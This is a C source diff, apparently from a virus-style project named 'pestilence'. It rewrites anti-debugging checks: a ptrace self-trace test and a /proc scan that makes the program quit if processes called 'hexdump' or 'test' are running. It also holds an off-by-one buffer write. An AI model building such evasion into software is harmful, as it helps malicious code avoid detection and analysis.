@@ -62,7 +62,7 @@ void decrypt_rol(uint8_t *data, const size_t size, uint64_t key) {
 	}
 }
 
-int	check_ptrace(void)
+static int	check_ptrace(void)
 {
 	if (_syscall(SYS_ptrace, PTRACE_TRACEME, 0, 0, 0) == -1)
 		return (1);
@@ -76,33 +76,34 @@ int	check_ptrace(void)
 static int check_proc(const char *dir_path) {
 
 	struct stat st;
-	const char *forbidden[] = {"hexdump", "test"};
-	const size_t forbidden_size = sizeof(forbidden) / sizeof(forbidden[0]);
+	const char *forbidden[] = {
+		((char []){"hexdump"}),
+		((char []){"test"}),
+		(void *)0
+	};
+
+	char file[PATH_MAX];
 
 	int fd = _syscall(SYS_open, dir_path, O_RDONLY);
-
 	if (fd == -1)
 		return 1;
 
-	if (_syscall(SYS_fstat, fd, &st) == -1) {
+	ssize_t ret = _syscall(SYS_read, fd, file, PATH_MAX);
+	if (ret == -1) {
 		_syscall(SYS_close, fd);
 		return 1;
 	}
 
+	file[ret] = '\0';
 
-	uint8_t* file = (uint8_t *)_syscall(SYS_mmap, 0, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
-
-	if (file == MAP_FAILED)
-		return 1;
-
-	_syscall(SYS_close, fd);
-
-	for (size_t i = 0; i < forbidden_size; ++i) {
+	for (size_t i = 0; forbidden[i]; ++i) {
 		if (ft_memcmp(file, forbidden[i], ft_strlen(forbidden[i])) == 0) {
-			_syscall(SYS_munmap, file, st.st_size);
+			_syscall(SYS_close, fd);
 			return 1;
 		}
 	}
+
+	_syscall(SYS_close, fd);
 
 	return 0;
 }
@@ -115,11 +116,11 @@ static int check_digit(const char *str) {
 	return 0;
 }
 
-static int open_proc(void)
+static int forbid_proc(void)
 {
 	const char proc[] = "/proc";
 
-	int fd = _syscall(SYS_open, "/proc", O_RDONLY);
+	int fd = _syscall(SYS_open, proc, O_RDONLY);
 
 	if (fd == -1)
 		return 1;
@@ -153,7 +154,7 @@ static int open_proc(void)
 				ft_strlcat(new_path, dir->d_name, PATH_MAX);
 				ft_strlcat(new_path, comm, PATH_MAX);
 
-				if (check_proc(new_path) == 0) {
+				if (check_proc(new_path) != 0) {
 					return 1;
 				}
 			}
@@ -163,9 +164,9 @@ static int open_proc(void)
 	return 0;
 }
 
-int forbid_proc(void)
+int pestilence(void)
 {
-	if (open_proc() != 0)
+	if (check_ptrace() != 0 || forbid_proc() != 0)
 		return 1;
 	return 0;
 }
